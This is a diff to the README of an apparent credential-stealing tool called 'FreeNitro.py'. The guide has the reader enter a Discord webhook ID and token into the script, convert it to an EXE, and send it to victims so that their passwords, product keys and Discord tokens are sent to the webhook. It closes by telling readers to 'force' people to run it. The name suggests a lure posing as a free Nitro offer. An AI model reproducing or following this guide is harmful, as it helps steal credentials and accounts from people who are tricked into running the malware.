@@ -23,6 +23,21 @@ Now go and download the FreeNitro.py script. Then go to where it says:
 # BELOW IS AN EXAMPLE OF WHAT YOUR WEBHOOK-ID, AND WEBHOOK-TOKEN IS
 #                      V "webhID"   V "webhAT"
 # discord/api/webhooks/000000000000/token
-webhID = "Your Webhook Id"
-webhAT = "Your Webhook Token"
+webhID = "Insert Your Webhook Id"
+webhAT = "Insert Your Webhook Token"
 ```
+In your ``webhID``, you have to place your webhook's ID. Use the link you copied from the webhook, and paste it in your browser.
+
+![Image description](https://i.imgur.com/MMXdF2D.png)
+
+The green circled are the Id and Token respectivley. Copy and paste them into the py file.
+
+Then the .py file is finished, and all you have to do is convert the py to an exe.
+
+# Converting to an EXE.
+Since this is a huge proccess, here's the link to the repository that explains more about it: https://github.com/brentvollebregt/auto-py-to-exe
+
+# Conclusion
+Once You have the exe, open it, and you'll see in your server, that the webhook you put will send a meessage including your passwords, product keys, and tokens on discord. If anyone person opens the exe, it will reveal every detail they have.
+
+In order to grab people's details, you must send the exe to them and force them to download it and run it. This is the entire process. Open an issue if you have a question.
